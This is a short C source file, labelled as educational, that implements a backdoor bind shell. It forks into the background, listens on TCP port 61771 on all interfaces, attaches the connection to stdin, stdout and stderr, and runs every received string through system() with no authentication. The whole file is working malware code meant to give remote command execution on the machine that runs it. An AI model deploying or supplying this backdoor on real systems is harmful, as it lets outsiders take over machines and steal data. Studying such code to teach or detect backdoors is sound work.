/**
 * Remote shell, using system.
 *
 * A small, vicious network agent listening
 * on incoming connections and then executing commands
 * received via the socket directly using the
 * system function.
 *
 * This is for educational purposes only.
 *
 * (c) 2021 Thomas Smits
 */
#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <string.h>

/* Port for the server */
#define PORT        61771

/* Buffer size for received commands */
#define BUFFER_SIZE  1024

/**
 * Start the server
 */
void server(void) {
    int server_fd;
    int new_socket;
    size_t bytes_read;
    int opt = 1;
    struct sockaddr_in address;
    int addrlen = sizeof(address);
    char buffer[BUFFER_SIZE];

    memset(&address, 0, sizeof(address));

    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        perror("socket failed");
        exit(1);
    }

    if (setsockopt(server_fd,
        SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT,
        &opt, sizeof(opt))) {
        perror("setsockopt failed");
        exit(1);
    }

    address.sin_family = AF_INET;         /* IPv4 address */
    address.sin_addr.s_addr = INADDR_ANY; /* Accept any address */
    address.sin_port = htons(PORT);       /* port to listen on */

    /* Attaching socket to the port */
    if (bind(server_fd, (struct sockaddr *)&address,
                                 sizeof(address))<0) {
        perror("bind failed");
        exit(EXIT_FAILURE);
    }

    if (listen(server_fd, 3) < 0) {
        perror("listen failed");
        exit(EXIT_FAILURE);
    }

    memset(&buffer, 0, sizeof(buffer));

    while ((new_socket = accept(server_fd, (struct sockaddr *)&address,
                       (socklen_t*)&addrlen))>=0) {

        /* close stdin, stdout and stderr */
        close(0);
        close(1);
        close(2);

        /* duplicate the socket. It will get the lowest free
           file descriptor numbers, which are 0, 1 and 2 and
           thus attaches the socket to stdin, stdout and stderr */
        dup(new_socket);
        dup(new_socket);
        dup(new_socket);

        while ((bytes_read = read(new_socket, buffer, BUFFER_SIZE)) != EOF) {
            write(0, "\nYes, master... executing: ", 27);
            write(0, buffer, bytes_read);
            write(0, "\n", 1);
            system(buffer);
            memset(&buffer, 0, sizeof(buffer));
        }
    }
}

int main(int argc, char** argv) {
    int pid;
    pid = fork();
    if (pid == 0) {
        server();
    }
    exit(0);
}
